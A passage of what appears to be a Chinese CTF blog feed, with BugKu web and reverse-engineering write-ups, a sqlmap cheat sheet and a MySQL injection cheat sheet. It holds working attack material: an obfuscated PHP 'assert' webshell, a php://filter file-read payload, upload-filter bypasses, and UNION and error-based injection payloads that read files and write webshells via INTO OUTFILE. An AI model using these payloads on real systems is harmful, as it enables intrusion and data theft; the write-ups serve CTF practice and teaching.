(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])</code></pre><p>上网搜一波,发现其为 jother 编码<br>可以直接在控制台里运行,得到 flag:<br><code>ctf{whatfk}</code><br>但还没完,必须大写才能提交</p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>页面里啥也没有<br>果断 Burp 抓包<br>在 Response 里发现 flag:<br><code>flag{Bugku_k8_23s_istra}</code></p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>源码,抓包无果,Dirsearch 扫描站点,发现 shell.php<br>进入,发现一个提交框<br>没有验证,考虑用 Burp 爆破<br>使用 Burp 自带的 Passwords 作为字典爆破<br>之后发现 hack 的响应长度不同于其他<br>在提交框里提交 hack,得到 flag:<br><code>flag{hack_bug_ku035}</code></p><h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>进入发现是一个登陆界面<br>因为是管理员系统,推测用户名为 admin<br>随便输入密码提交,回显<code>IP禁止访问，请联系本地管理员登陆，IP已被记录.</code><br>本地管理员,联想到伪造 IP 地址 <del>(不要问我为什么,CTF 的脑洞就是这么大)</del><br>Burp 抓包,修改包</p><pre><code>POST / HTTP/1.1Host: 123.206.31.85:1003Content-Length: 20Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36Origin: http://123.206.31.85:1003Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8X-Forwarded-For: 127.0.0.1 #伪造本地管理员IPReferer: http://123.206.31.85:1003/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeuser=admin&amp;pass=asdf</code></pre><p>提交,回显<br><code>Invalid credentials! Please try again!</code><br>密码不对,可以选择爆破<br>但查看网页源码发现 </p><pre><code class="lang-php">&lt;!-- dGVzdDEyMw== --&gt;</code></pre><p>看起来是 Base64 加密<br>解密得到 test123 猜测其为密码<br>提交,得到 flag:<br><code>The flag is: 85ff2ee4171396724bae20c0bd851f6b</code><br>按格式提交答案</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>进入提示看看源码<br>看到一段 JS 代码</p><pre><code class="lang-js">&lt;script&gt;var p1 = &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39;;var p2 = &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39;;eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));&lt;/script&gt;</code></pre><p>去掉 eval 函数在 Console 里运行<br>出现原文</p><pre><code class="lang-js">function checkSubmit(){    var a=document.getElementById(&quot;password&quot;);    if(&quot;undefined&quot;!=typeof a){        if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;        alert(&quot;Error&quot;);        a.focus();        return!1    }}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</code></pre><p>分析后提交 <code>67d709b2b54aa2aa648cf6e87a7114f1</code><br>得到 flag:<br><code>KEY{J22JK-HS11}</code></p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>题面只有一个链接<code>click me? no</code><br>点击后会在 URL 后面加 file=show.php<br>想到 php://filter<br>构造 payload:<code>?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>得到 Base64 加密的 index.php 源码,Base64 解码得到</p><pre><code class="lang-php">&lt;html&gt;          &lt;title&gt;Bugku-ctf&lt;/title&gt;            &lt;?php           error_reporting(0);           if(!$_GET[file]){        echo &#39;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#39;;}           $file=$_GET[&#39;file&#39;];           if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){            echo &quot;Oh no!&quot;;                exit();        }           include($file);                       //flag:flag{edulcni_elif_lacol_si_siht}      ?&gt; &lt;/html&gt;</code></pre><p>提交 flag:<br><code>flag{edulcni_elif_lacol_si_siht}</code></p><p>现在具体说说file=php://filter/read=convert.base64-encode/resource=index.php的含义</p><p>首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。</p><p>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</p><p>而include的内容是由用户控制的，所以通过我们传递的file参数，是include()函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p><p>如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的。</p><p>我们再看一下源码中 存在对 ../ tp data input 的过滤，其实这都是php://协议中的其他方法</p><h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><pre><code class="lang-php">&lt;?php     $poc=&quot;a#s#s#e#r#t&quot;;     $poc_1=explode(&quot;#&quot;,$poc);     $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];     $poc_2($_GET[&#39;s&#39;]) ?&gt;</code></pre><p>explode() 函数将 <code>$pos</code> 以 <code>#</code> 为界限打散装进 <code>$pos_1</code> 数组<br><code>$pos_2</code> 用 <code>.</code> 将 <code>$pos_1</code> 数组连接成 <code>assert</code><br>可以执行任意代码<br>读取 flag</p><blockquote><p>print_r(glob(‘<em>.php’)) 读取 .php 文件<br>print_r(glob(‘</em>.txt’)) 读取 .txt 文件<br>print_r(scandir(‘./‘)) 扫描当前目录,并输出</p></blockquote><h2 id="求-Getshell"><a href="#求-Getshell" class="headerlink" title="求 Getshell"></a>求 Getshell</h2><p>后缀名黑名单检测和类型检测</p><p>如果是 walf 严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，这里将文件的后缀名改为.jpg和.png都不可行，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> BugKu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SqlMap使用</title>
      <link href="/2019/02/18/SqlMap%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/02/18/SqlMap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Sqlmap使用"><a href="#Sqlmap使用" class="headerlink" title="Sqlmap使用"></a>Sqlmap使用</h1><h3 id="常规用法"><a href="#常规用法" class="headerlink" title="常规用法"></a>常规用法</h3><ul><li><code>python sqlmap.py -u &quot;地址&quot; --dbs</code> 列取数据库的所有库</li><li><code>python sqlmap.py -u &quot;地址&quot; --users</code> 查询所有用户</li><li><code>python sqlmap.py -u &quot;地址&quot; --passwords</code> 查询账户和密码</li><li><code>python sqlmap.py -u &quot;地址&quot; --current-db</code> 列取当前数据库</li><li><code>python sqlmap.py -u &quot;地址&quot; --current-user</code> 查询当前用户</li><li><code>python sqlmap.py -u &quot;地址&quot; -D 库名 --tables</code> 查询库中所有表</li><li><code>python sqlmap.py -u &quot;地址&quot; -D 库名 -T 表名 --columns</code> 查询指定库指定表中所有列</li><li><code>python sqlmap.py -u &quot;地址&quot; -D 库名 -T 表名 -C 字段,字段,字段 --dump</code> 查询指定库指定表指定列名的字段</li><li><code>-D 库名 -T 表名 -C 字段,字段 -start 1 -stop 10 --dump</code> 导出 1 到 10 行的字段</li></ul><h3 id="sqlmap-post-注入"><a href="#sqlmap-post-注入" class="headerlink" title="sqlmap post 注入"></a>sqlmap post 注入</h3><p>结合 burpsuite 来使用 sqlmap:</p><ol><li>浏览器打开目标地址http:// www.2cto.com /Login.as</li><li>配置 burp 代理 (127.0.0.1:8080) 以拦截请求</li><li>点击 login 表单的 submit 按钮</li><li>这时候 Burp 会拦截到了我们的登录 POST 请求</li><li>把这个 post 请求复制为 txt, 我这命名为 search-test.txt 然后把它放至 sqlmap 目录下</li><li>运行 sqlmap 并使用如下命令： <code>python sqlmap.py -r search-test.txt -p tfUPass</code> 参数 -r 是让 sqlmap 加载 post 请求 rsearch-test.txt， 而 -p 指定注入用的参数。</li></ol><h3 id="sqlmap-cookies注入"><a href="#sqlmap-cookies注入" class="headerlink" title="sqlmap cookies注入"></a>sqlmap cookies注入</h3><p><code>sqlmap.py -u “http://127.0.0.1/base.php” –cookies “id=1″ –dbs –level 2</code></p><p>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我 们直接在原有的基础上面加上 –level 2 即可</p><p>利用sqlmap cookies注入突破用户登录继续注入 先把用户登陆的cookie拿到吧， 在收藏夹添加一个链接cookies属性： 名字自己取 javascript:alert(document.cookie)，，需要获取当前cookie的时候， 直接点一下这个链接，然后复制一下弹出对话框 里的cookie值就搞定了</p><p><code>python sqlmap.py -u http://x.x.x.x/Down.aspx?tid=2 -p tid –dbms mssql –cookie=”info=username=test”</code></p><p>-p是指指定参数注入</p><h3 id="sqlmap遇到url重写的注入"><a href="#sqlmap遇到url重写的注入" class="headerlink" title="sqlmap遇到url重写的注入"></a>sqlmap遇到url重写的注入</h3><p>哪里存在注入就加上 <em> 号 `python sqlmap.py -u “<a href="http://www.cunlide.com/id1/1" target="_blank" rel="noopener">http://www.cunlide.com/id1/1</a></em>/id2/2“`</p><h3 id="sqlmap-编码绕waf注入"><a href="#sqlmap-编码绕waf注入" class="headerlink" title="sqlmap 编码绕waf注入"></a>sqlmap 编码绕waf注入</h3><ul><li><code>python sqlmap.py -u http://127.0.0.1/test.php?id=1 -v 3 –dbms “MySQL” –technique U -p id –batch –tamper “space2morehash.py”</code></li></ul><p>在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/164608.html</a></li><li><a href="http://www.91ri.org/3574.html" target="_blank" rel="noopener">http://www.91ri.org/3574.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SqlMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BugKu-Re</title>
      <link href="/2019/02/15/BugKu-Re/"/>
      <url>/2019/02/15/BugKu-Re/</url>
      
        <content type="html"><![CDATA[<h2 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h2><p>拖进 IDA 发现初始化了一推变量，直接全部 R 得到 flag</p><h2 id="easy-vb"><a href="#easy-vb" class="headerlink" title="easy_vb"></a>easy_vb</h2><p>拖进 IDA 看起来有壳，但是，往下看看，发现了 <code>MCTF{_N3t_Rev_1s_E4ay_}</code> 大喜，赶紧提交，然后错了。。。<br>回看题目，提交格式为 <code>flag{}</code> ，心想，哎呀**，入门题还要搞点坑让人跳，CTF 套路深，我还是溜了吧。<br>然后试了各种方法，啥都没发现。然后看了一篇题解，说是要把 <code>MCTF</code> 替换成 <code>flag</code>。<br>········<br>啥也别说了，CTF 套路深，我要回 OI。<br>提交 flag：<code>flag{_N3t_Rev_1s_E4ay_}</code></p><h2 id="Easy-Re"><a href="#Easy-Re" class="headerlink" title="Easy_Re"></a>Easy_Re</h2><p>拖进 IDA，F5 反编译</p><pre><code class="lang-cpp">int __cdecl main(int argc, const char **argv, const char **envp){  int v3; // eax  __int128 v5; // [esp+0h] [ebp-44h]  __int64 v6; // [esp+10h] [ebp-34h]  int v7; // [esp+18h] [ebp-2Ch]  __int16 v8; // [esp+1Ch] [ebp-28h]  char v9; // [esp+20h] [ebp-24h]  _mm_storeu_si128((__m128i *)&amp;v5, _mm_loadu_si128((const __m128i *)&amp;xmmword_413E34));  v7 = 0;  v6 = qword_413E44;  v8 = 0;  printf(&quot;欢迎来到DUTCTF呦\n&quot;);  printf(&quot;这是一道很可爱很简单的逆向题呦\n&quot;);  printf(&quot;输入flag吧:&quot;);  scanf(&quot;%s&quot;, &amp;v9);  v3 = strcmp((const char *)&amp;v5, &amp;v9);  if ( v3 )    v3 = -(v3 &lt; 0) | 1;  if ( v3 )    printf(aFlag_0);  else    printf((const char *)&amp;unk_413E90);  system(&quot;pause&quot;);  return 0;}</code></pre><p>就是输入一个字符串 v9 与 v5 比较<br>拖进 OD，在输入时加一个断点，观察寄存器的值得到 flag：<code>DUTCTF{We1c0met0DUTCTF}</code></p><pre><code>EAX 00000001ECX 00A9115D re1.00A9115DEDX 02C36BC0EBX 00000000ESP 006FFE54 ASCII &quot;DUTCTF{We1c0met0DUTCTF}&quot;EBP 006FFE98 ASCII &quot;帼o&quot;ESI 00A914A5 re1.&lt;ModuleEntryPoint&gt;EDI 00A914A5 re1.&lt;ModuleEntryPoint&gt;EIP 00A91062 re1.00A91062C 0  ES 002B 32bit 0(FFFFFFFF)P 0  CS 0023 32bit 0(FFFFFFFF)A 0  SS 002B 32bit 0(FFFFFFFF)Z 0  DS 002B 32bit 0(FFFFFFFF)S 0  FS 0053 32bit 5D1000(FFF)T 0  GS 002B 32bit 0(FFFFFFFF)D 0O 0  LastErr ERROR_SUCCESS (00000000)EFL 00000202 (NO,NB,NE,A,NS,PO,GE,G)ST0 empty 0.0ST1 empty 0.0ST2 empty 0.0ST3 empty 0.0ST4 empty 0.0ST5 empty 0.0ST6 empty 0.0ST7 empty 0.0               3 2 1 0      E S P U O Z D IFST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1</code></pre><h2 id="游戏过关"><a href="#游戏过关" class="headerlink" title="游戏过关"></a>游戏过关</h2><p>可以凭实力 1-8 通关游戏得 flag<br>也可通过 IDA 反编译分析代码得<br>flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> BugKu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>上传绕过</title>
      <link href="/2019/02/13/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
      <url>/2019/02/13/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/wy_97/article/details/76549761" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/76549761</a></p><p><a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/" target="_blank" rel="noopener">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/</a></p><p><a href="https://myzxcg.github.io/20171116.html" target="_blank" rel="noopener">https://myzxcg.github.io/20171116.html</a></p><p><a href="https://uuzdaisuki.com/2018/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://uuzdaisuki.com/2018/04/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 上传绕过 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python加解密</title>
      <link href="/2019/01/30/Python%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
      <url>/2019/01/30/Python%E5%8A%A0%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Python加解密"><a href="#Python加解密" class="headerlink" title="Python加解密"></a>Python加解密</h1><pre><code class="lang-py">import base64s=b&#39;asdf&#39; #必须是bytes类型s=base64.b64encode(s) #base64加密s=base64.b64decode(s) #base64解密s=base64.b32encode(s) #base32加密s=base64.b32decode(s) #base32解密</code></pre><pre><code class="lang-py">import hashlibs=b&#39;asdf&#39;md5=hashlib.md5() #创建md5方法md5.update(s) #md5加密md5.hexdigest() #回显md5值sha1=hashlib.sha1() #创建sha1方法sha1.update(s) #sha1加密sha1.hexdigest() #回显sha1值</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Console使用</title>
      <link href="/2019/01/18/Console%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/01/18/Console%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Console-使用"><a href="#Console-使用" class="headerlink" title="Console 使用"></a>Console 使用</h1><h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><pre><code class="lang-js">escape() // URL编码unescape() //URL解码btoa() //base64编码atob() //base64解码</code></pre><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><pre><code class="lang-js">console.clear() //清空控制台console.log() //用于输出普通信息console.info() //用于输出提示性信息console.error() //用于输出错误信息console.warn() //用于输出警示信息console.debug() //用于输出调试信息</code></pre><p><a href="https://blog.csdn.net/suyu_yuan/article/details/53063357" target="_blank" rel="noopener">https://blog.csdn.net/suyu_yuan/article/details/53063357</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Console </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF小技巧</title>
      <link href="/2019/01/10/CTF%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/01/10/CTF%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="将整数强制拆分为-string"><a href="#将整数强制拆分为-string" class="headerlink" title="将整数强制拆分为 string"></a>将整数强制拆分为 string</h2><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;string&gt;using namespace std;int main(){    long long v7=28537194573619560;    char *p=(char *)&amp;v7;//chr指针    char str[30];    strcpy(str,&quot;:\&quot;AL_RT^L*.?+6/46&quot;);    for(int i=0;i&lt;19;i++){        str[i]=p[i%7]^str[i];        printf(&quot;%c&quot;,str[i]);    }    return 0;}</code></pre><hr><h2 id="md5碰撞。"><a href="#md5碰撞。" class="headerlink" title="md5碰撞。"></a>md5碰撞。</h2><p>根据==用法，0 == 字符串是成立的，从而可以绕过MD5检查。</p><pre><code>QNKCDZO s878926199a s155964671a s214587387a s214587387a s878926199a s1091221200a s1885207154a aabC9RqS 240610708 aabg7XSs</code></pre><h2 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5() sha1()"></a>md5() sha1()</h2><p> MD5() 和 SHA1() 不能处理数组,PHP中会返回 false 构造sha1(str1)===sha1(str2) str1!=str2 时可以构造数组绕过</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP加解密</title>
      <link href="/2018/12/18/PHP%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
      <url>/2018/12/18/PHP%E5%8A%A0%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP加解密"><a href="#PHP加解密" class="headerlink" title="PHP加解密"></a>PHP加解密</h1><pre><code class="lang-php">&lt;?php    $s=&#39;asdf&#39;;    echo base64_encode($s); #base64加密    echo base64_decode($s); #bsae64解密    echo md5($s); #md5加密    echo sha1($s); #sha1加密    echo escape($s) #url加密    echo escape($s) #url解密?&gt;</code></pre><pre><code class="lang-php">&lt;?php #url完全加密    $a=$_GET[&#39;a&#39;];    function fullescape($in){        $out = &#39;&#39;;        for ($i=0;$i&lt;strlen($in);$i++){            $hex = dechex(ord($in[$i]));            if ($hex==&#39;&#39;)            $out = $out.urlencode($in[$i]);            else            $out = $out .&#39;%&#39;.((strlen($hex)==1) ? (&#39;0&#39;.strtoupper($hex)):(strtoupper($hex)));        }        $out = str_replace(&#39;+&#39;,&#39;%20&#39;,$out);        $out = str_replace(&#39;_&#39;,&#39;%5F&#39;,$out);        $out = str_replace(&#39;.&#39;,&#39;%2E&#39;,$out);        $out = str_replace(&#39;-&#39;,&#39;%2D&#39;,$out);        return $out;    }    echo fullescape($a);?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sql注入</title>
      <link href="/2018/12/18/Sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/12/18/Sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><strong>0x00 mysql一般注入(select)</strong></p><ol><li><p>注释符<br><code>#</code><br><code>/*</code><br><code>—</code></p></li><li><p>过滤空格注入<br>使用/**/或()或+代替空格<br>%0c = form feed, new page<br>%09 = horizontal tab<br>%0d = carriage return<br>%0a = line feed, new line</p></li><li><p>多条数据显示<br>concat()<br>group_concat()<br>concat_ws()</p></li><li><p>相关函数<br>system_user() 系统用户名<br>user() 用户名<br>current_user 当前用户名<br>session_user()连接数据库的用户名<br>database() 数据库名<br>version() MYSQL数据库版本<br>load_file() MYSQL读取本地文件的函数<br>@@datadir 读取数据库路径<br>@@basedir MYSQL 安装路径<br>@@version_compile_os 操作系统 Windows Server 2003<br>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root’@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION;</p></li><li><p>mysql一般注入语句<br>猜字段数<br>order by n/<em><br>查看mysql基本信息<br>and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/</em><br>查询数据库<br>and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1/<em><br>and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/</em><br>查询表名<br>and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1/<em><br>and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码/</em><br>查询字段<br>and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1/<em><br>and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码/</em><br>查询数据<br>and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/<em><br>判断是否具有读写权限<br>and (select count(</em>) from mysql.user)&gt;0/<em><br>and (select count(file_priv) from mysql.user)&gt;0/</em></p></li><li><p>mysql读取写入文件<br>必备条件：<br>读：file权限必备<br>写：1.绝对路径 2.union使用 3. 可以使用”<br>————————-读———————-<br>mysql3.x读取方法<br>create table a(cmd text);<br>load data infile ‘c:\\xxx\\xxx\\xxx.txt’ into table a;<br>select <em> from a;<br>mysql4.x读取方法<br>除上述方法还可以使用load_file()<br>create table a(cmd text);<br>insert into a(cmd) values(load_file(‘c:\\ddd\\ddd\\ddd.txt’));<br>select </em> from a;<br>mysql5.x读取方法<br>上述两种都可以<br>读取文件技巧：<br>load_file(char(32,26,56,66))<br>load_file(0x633A5C626F6F742E696E69)<br>————写————————–<br>into outfile写文件<br>union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/<em><br>union select 1,2,3,load_file(‘d:\web\logo123.jpg’),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/</em></p></li></ol><p><strong>0x01 mysql一般注入(insert、update)</strong></p><p>mysql一般请求mysql_query不支持多语句执行，mysqli可以。</p><p>insert注入多使用报错注入!</p><p>1.如果可以直接插入管理员可以直接使用!</p><p>insert into user(username,password) values(‘xxxx’,’ xxxx’),(‘dddd’,’dddd’)/* ‘);</p><p>2.如果可以插入一些数据，这些数据会在网页中显示，我们可以结合xxs和csrf来获取cookies或getshell</p><p>update注入同上</p><p><strong>0x02 mysql报错注入</strong></p><ol><li>and(select 1 from(select count(<em>),concat((select (select (语句)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) and 1=1</li></ol><p>语句处填入一般一句，如：SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1</p><ol><li>and+1=(select+*+from+(select+NAME_CONST((语句),1),NAME_CONST((语句),1))+as+x)–</li></ol><p>3.update web_ids set host=’www.0x50sec.org’ where id =1 aNd (SELECT 1 FROM (select count(<em>),concat(floor(rand(0)</em>2),(substring((Select 